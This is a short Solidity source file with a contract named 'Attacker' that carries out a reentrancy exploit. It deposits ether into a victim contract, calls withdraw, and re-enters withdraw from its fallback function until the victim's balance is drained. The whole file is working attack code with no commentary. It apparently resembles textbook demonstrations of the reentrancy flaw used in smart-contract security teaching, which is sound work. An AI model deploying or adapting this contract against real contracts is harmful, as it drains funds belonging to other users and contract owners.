pragma solidity ^0.6.10;

interface IVictim {
    function balances(address) external view returns (uint);
    function deposit() external payable;
    function withdraw(uint) external;
}

contract Attacker {
    
    address public victim;  
    
    constructor(address _victim) public {
        victim = _victim;
    }
    
    function deposit() public payable {
        IVictim(victim).deposit{value: msg.value}();
    }
    
    fallback() external payable {
        if(address(victim).balance > 1 ether){
            IVictim(victim).withdraw(1 ether);
        }
    }
    
    function attack() public {
        IVictim vc = IVictim(victim);
        require(vc.balances(address(this)) > 0, "Deposit before attack");
        vc.withdraw(1 ether);
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}